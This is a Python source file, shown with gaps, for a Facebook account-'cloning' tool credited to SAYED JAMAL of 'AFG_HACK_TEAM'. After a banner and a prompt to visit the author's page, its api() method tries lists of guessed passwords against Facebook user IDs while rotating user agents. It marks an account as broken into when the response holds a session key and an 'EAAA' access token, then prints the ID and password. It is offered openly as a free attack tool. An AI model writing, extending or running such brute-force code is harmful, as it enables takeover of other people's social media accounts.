#THE TOOL CREATED BY JAMAL
#BD Cyber Zone-BCZ
#FB :https://www.facebook.com/sayedjamal.afg
#PAGE :NO PAGE
#Programer:SAYED JAMAL
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 :ERROR
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
...
\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨
\33[1;32mWELCOME TO JAMAL COMMAND
\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨


╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     :SAYED JAMALL
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   :SAYED JAMALL
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     :AHT001/JAMALL
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙   :ERRORR
║\33[1;32m[↦] 𝚂𝚝𝚊𝚝𝚞𝚜     :FREE FOR ALL
║\33[1;32m[↦] 𝚃𝙴𝙰𝙼       :AFG_HACK_TEAM
║\33[1;32m[↦] 𝚅𝙴𝚁𝚂𝙸𝙾𝙽    : 1.00
╚════════════════════════════════════════╝
...
class Main:
	def __init__(self):
		...
		print("\n\033[1;32m㋱ WELCOME  TO MY COMMAND ㋱━─\033[1;32m")
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/Termux-Tools-502-100961239025559/')
			print("")
			time.sleep(2.0)
			print("\033[1;33m   This Is JAMAL")
			print("")
			input("\n\033[1;32m   ENTER MY FACEBOOK PAGE NAME  ==> \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m  Successful Bro Please WAIT...")
			print("\033[1;32m  The Tool Created By SAYEDJAMAL")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
		print('\x1b[1;32m [1]\x1b[1;35m CLONING OLD ID 2006-2010 ')
		print('\x1b[1;32m [2] \x1b[1;34mFOLLOW MY FACEBOOK ACCOUNT')
		print(' \x1b[1;32m\x1b[1;33m ')
	...
	def fbtua(self):
		...
		try:
			...
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using JAMALTools...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[JAMAL] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [JAMAL] %s | %s\033[1;32m         "%(uid, pw))
